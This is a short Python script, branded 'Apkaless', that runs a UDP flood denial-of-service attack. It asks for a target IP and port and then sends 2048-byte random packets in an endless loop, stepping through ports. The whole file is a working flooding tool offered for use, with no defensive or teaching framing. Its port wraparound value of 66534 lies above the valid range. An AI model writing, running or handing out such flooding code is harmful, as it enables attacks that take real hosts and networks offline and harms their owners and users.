import sys
import os
import socket
import random
import time

def DDosAttack():
     os.system("figlet Apkaless")
     time.sleep(2)
     print("")
     print("Creator  : BugleMan\n")
     print("Country  :  BugleLand\n")
     print("YouTube  \n")

     print("Facebook \n")
     print("GitHub  \n")
     time.sleep(1)
     
     #########################################
     
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(2048)
     
     #########################################
     
     target_ip = input("Target ip: ")
     print("")
     time.sleep(1)
     port = int(input("Port: "))
     time.sleep(1)
     sent = 0
     os.system("clear")
     os.system("figlet DDos Starting....")
     time.sleep(2)
     while True:
         s.connect((target_ip,port))
         s.sendto(bytes, (target_ip,port))
         sent = sent + 1
         port = port + 1
         print("Attacking %s Packets To Target %s on Port %s By Apkaless" %(sent,target_ip,port))
         if port == 66534:
             port = 1
DDosAttack()
